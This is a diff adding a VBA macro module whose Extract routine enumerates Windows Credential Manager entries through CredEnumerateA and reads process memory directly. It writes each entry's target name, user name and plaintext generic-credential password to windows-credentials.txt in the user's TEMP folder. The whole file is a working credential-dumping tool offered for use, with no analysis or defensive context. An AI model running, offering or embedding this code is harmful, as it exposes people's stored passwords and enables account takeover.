@@ -1,0 +1,157 @@
+Private Declare PtrSafe Function CEnumerateA Lib "advapi32.dll" Alias "CredEnumerateA" (ByVal Filter As String, _
+    ByVal Flags As Long, _
+    ByRef Count As Long, _
+    ByRef credential As LongPtr) As Boolean
+
+Private Declare PtrSafe Function VarPtrArray Lib "VBE7" Alias "VarPtr" (var() As Any) As LongPtr
+
+Public Const CRED_TYPE_GENERIC = &H1
+Public Const CRED_PERSIST_LOCAL_MACHINE = &H2
+
+#If Win64 Then
+    Public Const PTR_LENGTH As Long = 8
+    Public Const PTR_PW_LENGTH As Long = 80
+    Public Const PTR_PW_LOC As Long = 88
+#Else
+    Public Const PTR_LENGTH As Long = 4
+    Public Const PTR_PW_LENGTH As Long = 52
+    Public Const PTR_PW_LOC As Long = 56
+#End If
+
+Public Declare PtrSafe Sub Mem_Copy Lib "kernel32" Alias "RtlMoveMemory" (ByRef Destination As Any, _
+    ByRef Source As Any, _
+    ByVal Length As Long)
+
+Public Function strReverse_Character_Pairs(ByVal strValue As String) As String
+
+  Dim lngLoop As Long
+  Dim strReturn As String
+
+  strReturn = ""
+
+  For lngLoop = Len(strValue) - 1& To 1& Step -2&
+      strReturn = strReturn & Mid$(strValue, lngLoop, 2)
+  Next lngLoop
+
+  strReverse_Character_Pairs = strReturn
+End Function
+
+Function HexPtr(ByVal Ptr As LongPtr) As String
+    HexPtr = Hex$(Ptr)
+    HexPtr = String$((PTR_LENGTH * 2) - Len(HexPtr), "0") & HexPtr
+End Function
+
+Public Function HexToString(ByVal HexToStr As String) As String
+    Dim strTemp As String
+    Dim strReturn As String
+    Dim k As Long
+
+    For k = 1 To Len(HexToStr) Step 2
+        strTemp = Chr$(Val("&H" & Mid(HexToStr, k, 2)))
+        strReturn = strReturn & strTemp
+    Next k
+    HexToString = Right(strReturn, Len(strReturn))
+End Function
+
+Public Function Mem_ReadHex(ByVal Ptr As LongPtr, ByVal Length As Long) As Variant
+    Dim bBuffer() As Byte
+    Dim strBytes() As String
+    Dim I As Long
+    Dim ub As Long
+    Dim b As Byte
+
+    ub = Length - 1
+    ReDim bBuffer(ub)
+    ReDim strBytes(ub)
+    Mem_Copy bBuffer(0), ByVal Ptr, Length
+    For I = 0 To ub
+        b = bBuffer(I)
+        strBytes(I) = IIf(b < 16, "0", "") & Hex$(b)
+    Next
+
+    Mem_ReadHex = Join(strBytes, "")
+End Function
+
+
+Sub Extract()
+
+' Control Panel -> Credential Manager -> Windows Credentials
+
+Dim name As String
+Dim creds As LongPtr
+Dim dwCount As Long
+
+Dim ptrTemp As LongPtr
+Dim ptrArray() As LongPtr
+Dim memArray() As Variant
+
+Dim fs As Object
+Dim fPath As String
+
+Set fs = CreateObject("Scripting.FileSystemObject")
+fPath = Environ$("TEMP") + "\windows-credentials.txt"
+Set out = fs.CreateTextFile(fPath, True)
+
+Dim cnt As Integer
+cnt = 0
+
+s = CEnumerateA(vbNullString, 0, dwCount, creds)
+out.WriteLine ("Number of Creds: " & dwCount & vbNewLine)
+
+For I = 1 To dwCount
+
+    ReDim Preserve ptrArray(I)
+    ptrTemp = creds + ((I - 1) * PTR_LENGTH)
+    Mem_Copy ptrArray(I), ByVal ptrTemp, PTR_LENGTH
+
+Next I
+
+For I = 1 To UBound(ptrArray)
+    TargetName = ""
+    UserName = ""
+    fnl = ""
+    nullCnt = 0
+    cnt = 0
+
+    targetAliasPtr = CDec("&h" & strReverse_Character_Pairs(Mem_ReadHex(ptrArray(I) + 8, PTR_LENGTH)))
+
+    Do Until nullCnt = 2
+        blob = Mem_ReadHex(targetAliasPtr + cnt, 1)
+        fnl = fnl + blob
+        If blob = "00" Then
+            nullCnt = nullCnt + 1
+        End If
+        cnt = cnt + 1
+    Loop
+
+    arrayOfTargetandUser = Split(HexToString(fnl), vbNullChar)
+
+    If UBound(arrayOfTargetandUser) > 0 Then
+        TargetName = arrayOfTargetandUser(0)
+        UserName = arrayOfTargetandUser(1)
+        out.WriteLine ("Target Name: " & TargetName)
+        out.WriteLine ("User Name: " & UserName)
+    Else
+        TargetName = arrayOfTargetandUser(0)
+        out.WriteLine ("Target Name: " & TargetName)
+    End If
+
+    Flags = Mem_ReadHex(ptrArray(I) + 4, 1)
+    If Flags = "01" Then
+        ' Password Length
+        pwLen = CDec("&H" & strReverse_Character_Pairs(Mem_ReadHex(ptrArray(I) + PTR_PW_LENGTH, 4)))
+
+        ' Password as wide hex
+        pwd = Replace(Mem_ReadHex(ptrArray(I) + PTR_PW_LOC, pwLen), "00", "")
+        out.WriteLine ("Credential Type: Generic")
+        out.WriteLine ("Password: " & HexToString(pwd) & vbNewLine)
+
+    Else
+        out.WriteLine ("Credential Type: Windows")
+        out.WriteLine ("Password: WINDOWS CREDENTIAL (NULL)" & vbNewLine)
+    End If
+Next I
+
+out.Close
+
+End Sub
